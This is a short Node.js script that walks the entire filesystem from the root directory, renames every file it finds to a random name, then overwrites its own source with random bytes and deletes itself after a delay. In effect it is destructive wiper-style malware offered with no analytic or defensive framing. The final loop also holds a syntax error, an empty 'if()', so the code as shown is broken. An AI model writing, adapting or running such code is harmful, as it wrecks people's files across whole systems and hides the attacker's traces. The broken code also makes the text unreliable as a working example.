const path = require('path'),
crypto = require('crypto'),
fs = require('fs');

const config = {
  dest: '/',
  file: {
    max_name_size: 16,
    ext: ['', 'txt']
  },
  alpha: 'abcdefghijklmnopqrstuvwxyz',
  special: '1234567890',
  wipe: {
    rounds: 10,
    delay: 3000
  }
}

const utils = {
  mapfiles(dir, arr) {

    let files = fs.readdirSync(dir);
    if(!arr){

    }
    arr = arr || [];

    files.forEach(function(file) {
      if (fs.statSync(dir + "/" + file).isDirectory()) {
        arr = utils.mapfiles(dir + "/" + file, arr)
      } else {
        arr.push(path.join(dir, "/", file))
      }
    })

    return arr
  },
  shuffle(input){

    for (let i = input.length - 1; i >= 0; i--) {

      let ridx = Math.floor(Math.random() * (i + 1)),
      idx = input[ridx];

      input[ridx] = input[i];
      input[i] = idx;
    }
    return input;
  },
  rnd(x){
    return Math.floor(Math.random() * x) + 1;
  },
  rename(dest, alpha, cb){
    let newDest = dest.split('/').slice(0,-1);
    newDest = [newDest.join('/'),[
      utils.shuffle(alpha).slice(0, utils.rnd(config.file.max_name_size)).join(''),
      config.file.ext[utils.rnd(config.file.ext.length - 1)]
    ].join('.')].join('/');

    fs.rename(dest, newDest, function(err){
      if(err){return cb(err)}
      cb(false)
    })

  },
  wipe(){
    let len = fs.statSync(__filename).size,
    data;
    for (let i = 0; i < config.wipe.rounds; i++) {
      data = crypto.randomBytes(len);
      fs.writeFileSync(__filename, data.toString());
    }
    fs.unlinkSync(__filename);
  }
}

let alpha = utils.shuffle(
  (config.alpha.toUpperCase() + config.special + config.alpha).split('')
)

let files = utils.mapfiles(config.dest)

setTimeout(function(){
  utils.wipe();
},config.wipe.delay)


for (let x = 0; x < files.length; x++) {
  utils.rename(files[x], alpha, function(err){
    if(err){return console.log(err)}
    if()
  })
}
